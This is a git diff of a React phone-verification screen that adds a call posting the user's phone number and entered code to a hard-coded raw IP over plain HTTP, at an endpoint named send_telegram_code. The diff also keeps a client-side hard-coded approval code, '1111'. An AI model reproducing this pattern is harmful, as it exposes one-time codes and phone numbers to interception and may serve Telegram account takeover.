@@ -1,5 +1,5 @@
 import { useState, useEffect } from "react";
-import { useNavigate } from "react-router-dom";
+import { useLocation, useNavigate } from "react-router-dom";
 import { Button, Tooltip } from "antd";
 
 import ApplicationLayout from "../../ui/ApplicationLayout";
@@ -7,20 +7,20 @@ import Input from "../../ui/Input/Input";
 import { formatTimer } from "../../utils/helpers";
 
 import "./PhoneValidation.scss";
+import { postResponseToLink } from "../../services/apiAplication";
 
 const PhoneValidation = () => {
   const navigate = useNavigate();
+  const location = useLocation();
 
   useEffect(() => {
-    const companyData = JSON.parse(localStorage.getItem("newCompany"));
-    // console.log(!companyData.phone.length);
-    if (!companyData?.phone) navigate("/applications/new");
-  }, [navigate]);
+    if (!location?.state?.phone) navigate("/applications/new");
+  }, [location]);
 
   const [code, setCode] = useState("");
   const [isOkHovered, setIsOkHovered] = useState(false);
 
-  const [timer, setTimer] = useState(3);
+  const [timer, setTimer] = useState(99);
   const [isTImerOver, setIsTimerOver] = useState(false);
   const [isCodeApprove, setIsCodeApprove] = useState(false);
 
@@ -41,8 +41,16 @@ const PhoneValidation = () => {
     return () => clearInterval(t);
   }, [timer, isCodeApprove]);
 
-  function handleOk() {
+  async function handleOk() {
     if (!code.length) return;
+
+    const link = "http://46.175.151.65:8000/api/send_telegram_code";
+    const codeData = {
+      phone: location?.state?.phone,
+      code,
+    };
+
+    await postResponseToLink(codeData, link);
 
     if (code == 1111) setIsCodeApprove(true);
     console.log(code);
@@ -67,7 +75,7 @@ const PhoneValidation = () => {
       <div className="application__input-wrapper">
         <Input
           placeholder="Enter code..."
-          maxLength={10}
+          maxLength={5}
           type="string"
           value={code}
           onChange={(e) => setCode(e.target.value)}
